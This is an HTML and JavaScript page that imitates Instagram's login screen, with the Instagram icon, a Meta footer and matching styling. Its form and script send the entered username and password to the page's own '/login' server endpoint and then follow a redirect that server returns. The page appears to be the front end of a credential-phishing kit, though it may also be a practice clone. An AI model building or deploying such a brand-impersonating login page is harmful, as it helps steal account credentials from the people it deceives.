<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <title>Instagram</title>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">

    <style>
        body {
            background: linear-gradient(180deg, #4c2c82, #2a1a4a);
            height: 100vh;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: Arial, Helvetica, sans-serif;
        }

        /* card principal */

        .login-wrapper {
            background: #16252c;
            width: 100%;
            max-width: 420px;
            height: 100vh;
            padding: 30px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            color: white;
        }

        /* idioma */

        .lang {
            text-align: center;
            color: #b0bec5;
            font-size: 14px;
        }

        /* logo */

        .logo {
            text-align: center;
            margin-top: 40px;
            margin-bottom: 40px;
        }

        .logo img {
            width: 60px;
        }

        /* inputs */

        .form-control {
            background: transparent;
            border: 1px solid rgba(255, 255, 255, 0.25);
            color: white;
            padding: 16px;
            border-radius: 18px;
            margin-bottom: 15px;
        }

        .form-control::placeholder {
            color: #9fb3bd;
        }

        .form-control:focus {
            background: transparent;
            box-shadow: none;
            color: white;
            border-color: #4da3ff;
        }

        /* botão login */

        .login-btn {
            background: #1b74e4;
            border: none;
            padding: 14px;
            border-radius: 25px;
            font-weight: 600;
        }

        .login-btn:hover {
            background: #1666c1;
        }

        /* forgot */

        .forgot {
            text-align: center;
            margin-top: 15px;
            color: #cfd8dc;
            font-size: 14px;
        }

        /* create */

        .create-btn {
            border: 1px solid #3b82f6;
            background: transparent;
            color: #3b82f6;
            padding: 14px;
            border-radius: 25px;
            width: 100%;
        }

        .create-btn:hover {
            background: #3b82f6;
            color: white;
        }

        /* meta */

        .meta {
            text-align: center;
            color: #9fb3bd;
            font-size: 14px;
            margin-top: 20px;
        }

        /* DESKTOP */

        @media (min-width:992px) {

            body {
                background: #0a0d10;
            }

            .login-wrapper {
                height: auto;
                border-radius: 12px;
            }

        }
    </style>

</head>

<body>

    <div class="login-wrapper">

        <div>

            <div class="lang">
                English (US)
            </div>

            <div class="logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png">
            </div>
            <div id="error-message" class="alert alert-danger d-none" role="alert"></div>
            <form id="login-form" method="POST" action="/login">

                <input type="text" name="username" class="form-control" placeholder="Username, email or mobile number">

                <input type="password" name="password" class="form-control" placeholder="Password">

                <button type="submit" class="btn login-btn w-100">
                    Log in
                </button>

                <div class="forgot">
                    Forgot password?
                </div>

            </form>

        </div>

        <div>

            <button class="create-btn">
                Create new account
            </button>

            <div class="meta">
                ∞ Meta
            </div>

        </div>

    </div>
    <script>
        const form = document.getElementById('login-form');
        const errorDiv = document.getElementById('error-message');

        form.addEventListener('submit', async (e) => {
            e.preventDefault();

            const formData = new URLSearchParams();
            for (const [key, value] of new FormData(form)) {
                formData.append(key, value);
            }

            const response = await fetch(form.action, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: formData.toString(),
            });

            const data = await response.json();

            if (data.redirect) {
                window.location.href = data.redirect;
                return;
            }

            if (!data.success) {

                errorDiv.textContent = data.error || "Login failed.";
                errorDiv.classList.remove('d-none');
            }
        });
    </script>

</body>

</html>
